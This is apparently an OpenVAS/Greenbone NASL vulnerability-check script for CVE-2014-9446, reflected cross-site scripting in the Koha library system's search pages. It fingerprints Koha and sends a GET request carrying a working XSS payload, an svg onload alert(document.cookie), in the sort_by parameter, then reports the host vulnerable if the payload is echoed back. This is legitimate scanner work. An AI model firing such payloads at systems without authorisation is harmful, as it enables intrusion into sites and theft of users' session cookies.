if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805355" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2014-9446" );
	script_bugtraq_id( 71803 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-03-27 19:14:22 +0530 (Fri, 27 Mar 2015)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "Koha Multiple XSS Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Koha
  and is prone to multiple xss vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple errors exist as input passed via

  - The sort_by parameter to the opac parameter in 'opac-search.pl'

  - The sort_by parameter to the intranet parameter in 'catalogue/search.pl'
    not validated before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site." );
	script_tag( name: "affected", value: "Koha before 3.16.6 and 3.18.x before 3.18.2" );
	script_tag( name: "solution", value: "Upgrade to version 3.16.6 or 3.18.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/71803/info" );
	script_xref( name: "URL", value: "http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=13425" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.koha.org" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/" ), port: http_port );
	if(ContainsString( rcvRes, "Log in to Koha" ) || rcvRes && IsMatchRegexp( rcvRes, "Powered by.*Koha" )){
		url = dir + "/cgi-bin/koha/opac-search.pl?idx=kw&q=12&sort_by=" + "\"><svg/onload=alert(document.cookie)>&addto=";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "alert\\(document\\.cookie\\)", extra_check: ">Log in" )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

